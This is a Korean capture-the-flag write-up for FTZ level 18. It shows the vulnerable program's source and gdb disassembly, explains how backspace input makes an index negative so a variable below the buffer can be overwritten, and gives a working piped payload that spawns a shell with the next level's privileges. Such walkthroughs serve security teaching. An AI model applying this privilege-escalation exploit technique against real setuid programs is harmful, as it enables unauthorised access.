# **FTZ LEVEL 18**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
void shellout(void);
int main()
{
  char string[100];
  int check;
  int x = 0;
  int count = 0;
  fd_set fds;
  printf("Enter your command: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 100)
        printf("what are you trying to do?\n");
      if(check == 0xdeadbeef)
        shellout();
      else
        {
          FD_ZERO(&fds);
          FD_SET(STDIN_FILENO,&fds);
 
          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
            {
              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)
                    {
                      case '\r':
                      case '\n':
                        printf("\a");
                        break;
                      case 0x08:
                        count--;
                        printf("\b \b");
                        break;
                      default:
                        string[count] = x;
                        count++;
                        break;
                    }
                }
            }
        }
    }
}
 
void shellout(void)
{
  setreuid(3099,3099);
  execl("/bin/sh","sh",NULL);
```
`string[]` 보다 `check` 가 늦게 선언되어 `stack` 의 특성 상 `check` 부분을 원하는 값으로 덮는 것이 불가능하다.  
하지만 `case` 문에서 `0x08` 이 `count--;` 해주고, `defalut`에서 `string[count]` 에 `x` 를 넣어 준다.  
따라서 `count` 를 음수로 잡으면 `string` 전에 있는 메모리도 변조할 수 있다.

gdb로 분석하면
```
(gdb) disas main
Dump of assembler code for function main:
0x08048550 <main+0>:	push   ebp
0x08048551 <main+1>:	mov    ebp,esp
0x08048553 <main+3>:	sub    esp,0x100
0x08048559 <main+9>:	push   edi
0x0804855a <main+10>:	push   esi
0x0804855b <main+11>:	push   ebx
0x0804855c <main+12>:	mov    DWORD PTR [ebp-108],0x0
0x08048563 <main+19>:	mov    DWORD PTR [ebp-112],0x0
0x0804856a <main+26>:	push   0x8048800
0x0804856f <main+31>:	call   0x8048470 <printf>
0x08048574 <main+36>:	add    esp,0x4
0x08048577 <main+39>:	mov    eax,ds:0x804993c
0x0804857c <main+44>:	mov    DWORD PTR [ebp-252],eax
0x08048582 <main+50>:	mov    ecx,DWORD PTR [ebp-252]
0x08048588 <main+56>:	push   ecx
0x08048589 <main+57>:	call   0x8048430 <fflush>
0x0804858e <main+62>:	add    esp,0x4
0x08048591 <main+65>:	jmp    0x8048598 <main+72>
0x08048593 <main+67>:	jmp    0x8048775 <main+549>
0x08048598 <main+72>:	cmp    DWORD PTR [ebp-112],0x63
0x0804859c <main+76>:	jle    0x80485ab <main+91>
0x0804859e <main+78>:	push   0x8048815
0x080485a3 <main+83>:	call   0x8048470 <printf>
0x080485a8 <main+88>:	add    esp,0x4
0x080485ab <main+91>:	cmp    DWORD PTR [ebp-104],0xdeadbeef
0x080485b2 <main+98>:	jne    0x80485c0 <main+112>
0x080485b4 <main+100>:	call   0x8048780 <shellout>
0x080485b9 <main+105>:	jmp    0x8048770 <main+544>
0x080485be <main+110>:	mov    esi,esi
0x080485c0 <main+112>:	lea    edi,[ebp-240]
0x080485c6 <main+118>:	mov    DWORD PTR [ebp-252],edi
0x080485cc <main+124>:	mov    ecx,0x20
0x080485d1 <main+129>:	mov    edi,DWORD PTR [ebp-252]
0x080485d7 <main+135>:	xor    eax,eax
0x080485d9 <main+137>:	cld    
0x080485da <main+138>:	repz stos es:[edi],eax
0x080485dc <main+140>:	mov    DWORD PTR [ebp-244],ecx
---Type <return> to continue, or q <return> to quit---
0x080485e2 <main+146>:	mov    DWORD PTR [ebp-248],edi
0x080485e8 <main+152>:	jmp    0x80485f2 <main+162>
0x080485ea <main+154>:	lea    esi,[esi]
0x080485f0 <main+160>:	jmp    0x80485c0 <main+112>
0x080485f2 <main+162>:	xor    eax,eax
0x080485f4 <main+164>:	bts    DWORD PTR [ebp-240],eax
0x080485fb <main+171>:	push   0x0
0x080485fd <main+173>:	push   0x0
0x080485ff <main+175>:	push   0x0
0x08048601 <main+177>:	lea    ecx,[ebp-240]
0x08048607 <main+183>:	mov    DWORD PTR [ebp-252],ecx
0x0804860d <main+189>:	mov    edi,DWORD PTR [ebp-252]
0x08048613 <main+195>:	push   edi
0x08048614 <main+196>:	push   0x400
0x08048619 <main+201>:	call   0x8048440 <select>
0x0804861e <main+206>:	add    esp,0x14
0x08048621 <main+209>:	mov    DWORD PTR [ebp-252],eax
0x08048627 <main+215>:	cmp    DWORD PTR [ebp-252],0x0
0x0804862e <main+222>:	jle    0x8048770 <main+544>
0x08048634 <main+228>:	mov    eax,ds:0x8049940
0x08048639 <main+233>:	mov    DWORD PTR [ebp-252],eax
0x0804863f <main+239>:	mov    ecx,DWORD PTR [ebp-252]
0x08048645 <main+245>:	push   ecx
0x08048646 <main+246>:	call   0x8048420 <fileno>
0x0804864b <main+251>:	add    esp,0x4
0x0804864e <main+254>:	mov    DWORD PTR [ebp-252],eax
0x08048654 <main+260>:	mov    esi,DWORD PTR [ebp-252]
0x0804865a <main+266>:	and    esi,0x1f
0x0804865d <main+269>:	mov    edi,ds:0x8049940
0x08048663 <main+275>:	mov    DWORD PTR [ebp-252],edi
0x08048669 <main+281>:	mov    eax,DWORD PTR [ebp-252]
0x0804866f <main+287>:	push   eax
0x08048670 <main+288>:	call   0x8048420 <fileno>
0x08048675 <main+293>:	add    esp,0x4
0x08048678 <main+296>:	mov    DWORD PTR [ebp-252],eax
0x0804867e <main+302>:	mov    edx,DWORD PTR [ebp-252]
0x08048684 <main+308>:	shr    edx,0x5
0x08048687 <main+311>:	lea    ecx,[edx*4]
---Type <return> to continue, or q <return> to quit---
0x0804868e <main+318>:	mov    DWORD PTR [ebp-252],ecx
0x08048694 <main+324>:	lea    edx,[ebp-240]
0x0804869a <main+330>:	mov    edi,DWORD PTR [ebp-252]
0x080486a0 <main+336>:	bt     DWORD PTR [edi+edx],esi
0x080486a4 <main+340>:	setb   bl
0x080486a7 <main+343>:	test   bl,bl
0x080486a9 <main+345>:	je     0x8048770 <main+544>
0x080486af <main+351>:	push   0x1
0x080486b1 <main+353>:	lea    eax,[ebp-108]
0x080486b4 <main+356>:	mov    DWORD PTR [ebp-252],eax
0x080486ba <main+362>:	mov    ecx,DWORD PTR [ebp-252]
0x080486c0 <main+368>:	push   ecx
0x080486c1 <main+369>:	mov    edi,ds:0x8049940
0x080486c7 <main+375>:	mov    DWORD PTR [ebp-252],edi
0x080486cd <main+381>:	mov    eax,DWORD PTR [ebp-252]
0x080486d3 <main+387>:	push   eax
0x080486d4 <main+388>:	call   0x8048420 <fileno>
0x080486d9 <main+393>:	add    esp,0x4
0x080486dc <main+396>:	mov    DWORD PTR [ebp-252],eax
0x080486e2 <main+402>:	mov    ecx,DWORD PTR [ebp-252]
0x080486e8 <main+408>:	push   ecx
0x080486e9 <main+409>:	call   0x8048490 <read>
0x080486ee <main+414>:	add    esp,0xc
0x080486f1 <main+417>:	mov    edi,DWORD PTR [ebp-108]
0x080486f4 <main+420>:	mov    DWORD PTR [ebp-252],edi
0x080486fa <main+426>:	cmp    DWORD PTR [ebp-252],0xa
0x08048701 <main+433>:	je     0x8048722 <main+466>
0x08048703 <main+435>:	cmp    DWORD PTR [ebp-252],0xa
0x0804870a <main+442>:	jg     0x8048717 <main+455>
0x0804870c <main+444>:	cmp    DWORD PTR [ebp-252],0x8
0x08048713 <main+451>:	je     0x8048731 <main+481>
0x08048715 <main+453>:	jmp    0x8048743 <main+499>
0x08048717 <main+455>:	cmp    DWORD PTR [ebp-252],0xd
0x0804871e <main+462>:	je     0x8048722 <main+466>
0x08048720 <main+464>:	jmp    0x8048743 <main+499>
0x08048722 <main+466>:	push   0x8048831
0x08048727 <main+471>:	call   0x8048470 <printf>
0x0804872c <main+476>:	add    esp,0x4
---Type <return> to continue, or q <return> to quit---
0x0804872f <main+479>:	jmp    0x8048770 <main+544>
0x08048731 <main+481>:	dec    DWORD PTR [ebp-112]
0x08048734 <main+484>:	push   0x8048833
0x08048739 <main+489>:	call   0x8048470 <printf>
0x0804873e <main+494>:	add    esp,0x4
0x08048741 <main+497>:	jmp    0x8048770 <main+544>
0x08048743 <main+499>:	lea    eax,[ebp-100]
0x08048746 <main+502>:	mov    DWORD PTR [ebp-252],eax
0x0804874c <main+508>:	mov    edx,DWORD PTR [ebp-112]
0x0804874f <main+511>:	mov    cl,BYTE PTR [ebp-108]
0x08048752 <main+514>:	mov    BYTE PTR [ebp-253],cl
0x08048758 <main+520>:	mov    al,BYTE PTR [ebp-253]
0x0804875e <main+526>:	mov    ecx,DWORD PTR [ebp-252]
0x08048764 <main+532>:	mov    BYTE PTR [edx+ecx],al
0x08048767 <main+535>:	inc    DWORD PTR [ebp-112]
0x0804876a <main+538>:	jmp    0x8048770 <main+544>
0x0804876c <main+540>:	lea    esi,[esi*1]
0x08048770 <main+544>:	jmp    0x8048591 <main+65>
0x08048775 <main+549>:	lea    esp,[ebp-268]
0x0804877b <main+555>:	pop    ebx
0x0804877c <main+556>:	pop    esi
0x0804877d <main+557>:	pop    edi
0x0804877e <main+558>:	leave  
0x0804877f <main+559>:	ret    
End of assembler dump.
```
어셈코드가 굉장히 길지만 우리에게 필요한 것은 `string` 의 시작, `check` 의 시작 부분이다. 우선 우리가 필요한 코드만 잘라보겠다.
```
0x0804855b <main+11>:	push   ebx
0x0804855c <main+12>:	mov    DWORD PTR [ebp-108],0x0
0x08048563 <main+19>:	mov    DWORD PTR [ebp-112],0x0
0x0804856a <main+26>:	push   0x8048800
```
`ebp-108` 부분과 `ebp-112` 부분을 0으로 초기화 시키고 있다.  
attackme.c 와 비교해서 보면 `ebp-108` 는 `x` 이고, `ebp-112` 는 `count` 라는 것을 알 수 있다.
```
0x080485a3 <main+83>:	call   0x8048470 <printf>
0x080485a8 <main+88>:	add    esp,0x4
0x080485ab <main+91>:	cmp    DWORD PTR [ebp-104],0xdeadbeef
0x080485b2 <main+98>:	jne    0x80485c0 <main+112>
0x080485b4 <main+100>:	call   0x8048780 <shellout>
```
`deadbeef` 에서 비교하는 `main+91` 부분에서 `check` 가 `ebp-104` 부분이라는 것을 알았다.
```
0x08048743 <main+499>:	lea    eax,[ebp-100]
0x08048746 <main+502>:	mov    DWORD PTR [ebp-252],eax
0x0804874c <main+508>:	mov    edx,DWORD PTR [ebp-112]
0x0804874f <main+511>:	mov    cl,BYTE PTR [ebp-108]
0x08048752 <main+514>:	mov    BYTE PTR [ebp-253],cl
0x08048758 <main+520>:	mov    al,BYTE PTR [ebp-253]
0x0804875e <main+526>:	mov    ecx,DWORD PTR [ebp-252]
0x08048764 <main+532>:	mov    BYTE PTR [edx+ecx],al
0x08048767 <main+535>:	inc    DWORD PTR [ebp-112]
0x0804876a <main+538>:	jmp    0x8048770 <main+544>
```
`switch` 안에 있는 `default` 이다.  
여기서 `string` 이 `ebp-100` 에 위치한다는 것을 알았다.  
`eax` 에 `string` 을 넣고, `string` 을 다시 `ebp-252` 부분에 넣는다.  
그 다음 `count` 를 `edx` 에 넣고, `x` 를 `cl` 에 넣는다.  
현재 `eax` 와 `ebp-252` 부분에는 `string` 이, `edx` 에는 `count` 가, `cl` 에는 `x` 가 들어가 있다.  
그 다음 `cl` 을 `ebp-253` 에 넣고 다시 `ebp-253` 을 `al` 에 넣는다.  
다음 `ebp-252` 를 `ecx` 에 넣는다.  
그럼 현재 `eax` 와 `ebp-252` , `ecx` 부분에는 `string` 이, `edx` 에는 `count` 가, `cl` , `ebp-253` , `al` 에는 `x` 가 들어가 있다.  
`main+532` 부분에서 `string` 의 `count` 번째 수에 `x` 를 넣어준다. 어셈블리어에서 배열에 값를 넣을 때는 어셈명령어 `mov` 를 쓰고 넣는 값의 크기에 따라 1byte면 `BYTE PTR` , 2byte면 `WORD PTR` , 4byte면 `DWORD PTR` 라고 쓴다. 그 다음 [넣는 번째 + 배열 이름], 넣는 값 형식으로 쓴다.

>수집한 정보

변 수 | 주 소 
--- | ---
string | ebp-100
count | ebp-112
x | ebp-108
check | ebp-104

`string` 에 입력을 받을 때 `count` 를 4 줄이고 그 부분에 `deadbeef` 를 넣겠다.

## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| count[4] | x[4] | check[4] | string[100] | sfp[4] | ret[4] |
```

>Payload
```
 (python -c "print '\x08'*4+'\xef\xbe\xad\xde'";cat) | ./attackme 
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level18@ftz level18]$ (python -c "print '\x08'*4+'\xef\xbe\xad\xde'";cat) | ./attackme 
Enter your command: 

id
uid=3099(level19) gid=3098(level18) groups=3098(level18)
my-pass               

Level19 Password is "~~~~~~~~~".
```